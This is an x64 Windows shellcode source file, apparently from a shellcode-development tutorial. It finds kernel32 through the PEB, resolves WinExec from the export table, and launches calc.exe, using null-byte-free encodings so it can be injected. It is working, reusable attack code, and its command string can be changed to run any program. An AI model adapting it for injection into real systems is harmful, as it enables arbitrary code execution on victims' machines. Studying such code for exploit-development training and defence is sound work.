bits 64
; Credits to https://www.bordergate.co.uk/windows-x64-shellcode-development/

start:
; int3;
;  sub rsp, 0x208;                ; Make some room on the stack (NULL BYTE)
  add rsp, 0xfffffffffffffdf8;    ; Avoid Null Byte
 locate_kernel32:
   xor rcx, rcx;                  ; Zero RCX contents
   mov rax, gs:[rcx + 0x60];      ; 0x060 ProcessEnvironmentBlock to RAX.
   mov rax, [rax + 0x18];         ; 0x18  ProcessEnvironmentBlock.Ldr Offset
   mov rsi, [rax + 0x20];         ; 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
   lodsq;                         ; Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
   xchg rax, rsi;                 ; Swap RAX,RSI
   lodsq;                         ; Load qword at address (R)SI into RAX
   mov rbx, [rax + 0x20] ;        ; RBX = Kernel32 base address
   mov r8, rbx;                   ; Copy Kernel32 base address to R8 register

; Code for parsing Export Address Table
   mov ebx, [rbx+0x3C];           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
   add rbx, r8;                   ; Add defrerenced signature offset to kernel32 base. Store in RBX.
;    mov edx, [rbx+0x88];          ; Offset from PE32 Signature to Export Address Table (NULL BYTE)
   xor r12,r12;
   add r12, 0x88FFFFF;
   shr r12, 0x14;
   mov edx, [rbx+r12];            ; Offset from PE32 Signature to Export Address Table

   add rdx, r8;                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
   mov r10d, [rdx+0x14];          ; Number of functions
   xor r11, r11;                  ; Zero R11 before use
   mov r11d, [rdx+0x20];          ; AddressOfNames RVA
   add r11, r8;                   ; AddressOfNames VMA

; Loop over Export Address Table to find WinExec name
   mov rcx, r10;                  ; Set loop counter
kernel32findfunction:
 jecxz FunctionNameFound;         ; Loop around this function until we find WinExec
   xor ebx,ebx;                   ; Zero EBX for use
   mov ebx, [r11+4+rcx*4];        ; EBX = RVA for first AddressOfName
   add rbx, r8;                   ; RBX = Function name VMA
   dec rcx;                       ; Decrement our loop by one
;    mov rax, 0x00636578456E6957;   ; WinExec (NULL BYTE)
   mov rax, 0x636578456E6957FF;   ; WinExec
   shr rax, 0x8;
   cmp [rbx], rax;                ; Check if we found WinExec
   jnz kernel32findfunction;

FunctionNameFound:
; We found our target
   xor r11, r11;
   mov r11d, [rdx+0x24];          ; AddressOfNameOrdinals RVA
   add r11, r8;                   ; AddressOfNameOrdinals VMA
; Get the function ordinal from AddressOfNameOrdinals
   inc rcx;
   mov r13w, [r11+rcx*2];         ; AddressOfNameOrdinals + Counter. RCX = counter
; Get function address from AddressOfFunctions
   xor r11, r11;
   mov r11d, [rdx+0x1c];          ; AddressOfFunctions RVA
   add r11, r8;                   ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov eax, [r11+4+r13*4];        ; Get the function RVA.
   add rax, r8;                   ; Add base address to function RVA
   mov r14, rax;

; WinExec Call
  xor rax, rax;                   ; Zero RAX to become a null byte
  push rax;                       ; Push the null byte to the stack
  mov rax, 0x6578652E636C6163;    ; Add calc.exe string to RAX.
  push rax;                       ; Push RAX to stack
  mov rcx, rsp;                   ; Move a pointer to calc.exe into RCX.
  xor rdx,rdx;                    ; Zero RDX
  inc rdx;                        ; RDX set to 1 = uCmdShow
  sub rsp, 0x20;                  ; Make some room on the stack so it's not clobbered by WinExec
  call r14;                       ; Call WinExec

